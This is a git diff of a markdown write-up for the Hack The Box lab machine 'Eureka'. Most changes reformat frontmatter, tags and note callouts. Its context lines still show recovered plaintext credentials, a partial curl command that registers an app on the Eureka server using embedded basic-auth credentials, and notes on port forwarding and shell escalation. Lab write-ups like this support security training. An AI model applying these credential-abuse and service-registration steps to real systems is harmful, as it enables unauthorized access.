@@ -1,16 +1,17 @@
-﻿---
+---
 title: 'HTB-Eureka'
-published: 2025-09-18
+published: 2025-07-15
 draft: false
 toc: true
+tags: ['nuclei', 'JDumpSpider', 'EurekaServer', 'pspy']
 ---
-**Start 14:38 15-07-2025**
 
 ---
 ```
 Scope:
 10.10.11.66
 ```
+
 # Recon
 ## Nmap
 
@@ -77,9 +78,10 @@ oscar190
 0sc@r190_S0l!dP@sswd
 ```
 
->[!note]
->This also appears to be the `mysql` creds:
->![](attachments/00379a4f43530a49b945d1024bafea6c.png)
+:::note
+This also appears to be the `mysql` creds:
+![](attachments/00379a4f43530a49b945d1024bafea6c.png)
+:::
 
 ## 80/TCP - HTTP
 
@@ -174,8 +176,9 @@ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@240.0.0.1:8761/eureka/apps/USER
 '
 ```
 
->[!important]
->But in order to communicate with the server we will first have to port forward in order to reach the `localhost`
+:::important
+But in order to communicate with the server we will first have to port forward in order to reach the `localhost`
+:::
 
 ### Port Forward
 
@@ -244,10 +247,3 @@ I can now go ahead and escalate the shell:
 ![](attachments/7df7af860471b4a2edf67ebd5e689112.png)
 
 ---
-
-**Finished 16:40 15-07-2025**
-
-[^Links]: [[Hack The Box]]
-
-#nuclei #JDumpSpider #EurekaServer #pspy 
-
